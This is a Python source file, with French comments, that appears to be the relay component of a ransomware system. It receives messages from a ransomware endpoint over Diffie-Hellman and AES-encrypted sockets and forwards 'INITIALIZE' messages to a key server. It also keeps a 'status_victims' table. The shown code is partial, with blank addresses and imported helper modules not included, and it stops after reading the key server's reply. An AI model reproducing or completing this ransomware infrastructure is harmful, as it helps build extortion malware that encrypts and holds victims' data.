# import queue
# import threading
# from threading import Thread, Lock
import utile.network as network
import utile.message as message
import utile.security as security
# import utile.input as my_input
# import utile.config as config

# Constantes
IP_SERV_CLES = ''
PORT_SERV_CLES = 8381
CONN_RETRY_SERV_CLES = 0
IP_RANSOMWARE = ''
PORT_RANSOMWARE = 8443
CONFIG_SERVEUR = {}
CONFIG_WORKSTATION = {}

# Variable globale
status_victims = {}


def main():
    while True:
        socket_ransomware = network.connect_to_serv(IP_RANSOMWARE, PORT_RANSOMWARE)
        key = security.diffie_hellman_send_key(socket_ransomware)
        encrypted_message_ransomware = network.receive_message(socket_ransomware)
        message_ransomware = security.aes_decrypt(encrypted_message_ransomware, key)
        if message_ransomware is None:
            print("Aucun message reçu, connexion fermée.")
            socket_ransomware.close()
            continue
        print(f"Message reçu: {message_ransomware}")
        print(f"Message de type: {message.get_message_type(message_ransomware)}")
        type_message = message.get_message_type(message_ransomware)
        if type_message == "INITIALIZE":
            socket_serv_cle = network.connect_to_serv(IP_SERV_CLES, PORT_SERV_CLES, CONN_RETRY_SERV_CLES)
            key_serv_cle = security.diffie_hellman_send_key(socket_serv_cle)
            message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
            network.send_message(socket_serv_cle, message_serv_cle_crypt)
            response_serv_cle_crypt = network.receive_message(socket_serv_cle)
            response_serv_cle = security.aes_decrypt(response_serv_cle_crypt, key_serv_cle)



if __name__ == '__main__':
    main()
